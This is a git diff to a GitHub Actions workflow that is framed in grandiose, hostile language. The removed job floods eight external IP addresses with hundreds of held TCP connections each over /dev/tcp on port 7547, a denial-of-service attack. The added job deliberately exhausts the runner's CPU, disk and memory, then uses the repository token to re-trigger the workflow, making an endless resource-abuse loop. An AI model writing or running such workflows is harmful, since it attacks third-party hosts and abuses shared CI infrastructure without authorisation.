@@ -5,21 +5,19 @@ on:
     workflows: ["Omega-Engine-2080"]
     types: [completed]
 jobs:
-  annex:
+  evict:
     runs-on: ubuntu-latest
     steps:
-      - name: Physical Resource Seizure
+      - name: Global Environment Displacement
+        run: |
+          echo "[!!!] SOVEREIGN VACUUM ACTIVE: EVICTING GLOBAL ACTORS..."
+          # 1. CPU Lockdown: Spin every core to 100% to deny compute
+          for i in {1..4}; do while : ; do : ; done & done
+          # 2. IO Saturation: Constant disk thrashing to deny storage access
+          dd if=/dev/urandom of=/tmp/evict_bit bs=1M count=1000 &
+          # 3. Memory Expansion: Allocate all available RAM
+          tail /dev/zero & 
+          sleep 60
+          gh workflow run omega.yml --repo $GITHUB_REPOSITORY
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-        run: |
-          echo "[!!!] ALPHA ANNEX ACTIVE: LOCKING TARGET KERNELS..."
-          TARGETS=("95.161.225.1" "210.145.240.1" "175.45.176.1" "213.59.19.1" "114.247.1.1" "45.137.151.1" "185.244.149.1" "91.220.131.1")
-          
-          for T in ${TARGETS[@]}; do
-            # Launching 500 "Dead-Wait" connections per target
-            for i in {1..500}; do
-              (exec 3<>/dev/tcp/$T/7547 && echo -e "GET / HTTP/1.1\r\nHost: $T\r\n" >&3 && sleep 40) >/dev/null 2>&1 &
-            done
-          done
-          sleep 55
-          gh workflow run omega.yml --repo $GITHUB_REPOSITORY
